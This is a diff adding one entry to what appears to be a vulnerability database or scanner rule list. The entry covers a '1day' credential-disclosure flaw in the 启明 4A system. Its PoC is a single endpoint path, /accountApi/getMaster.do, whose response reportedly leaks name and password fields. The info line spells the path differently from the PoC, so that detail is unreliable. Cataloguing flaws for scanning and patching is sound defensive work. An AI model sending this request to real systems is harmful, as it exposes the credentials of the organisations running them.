@@ -1,0 +1,8 @@
+vendor = "启明"
+name = "启明4A getMaster信息泄露"
+type = "信息泄露"
+source = "TG"
+info = "/accountAzpi/getMaster.do 响应包存在以下字段： name password"
+date = "08.11"
+poc = "/accountApi/getMaster.do"
+label = "1day"
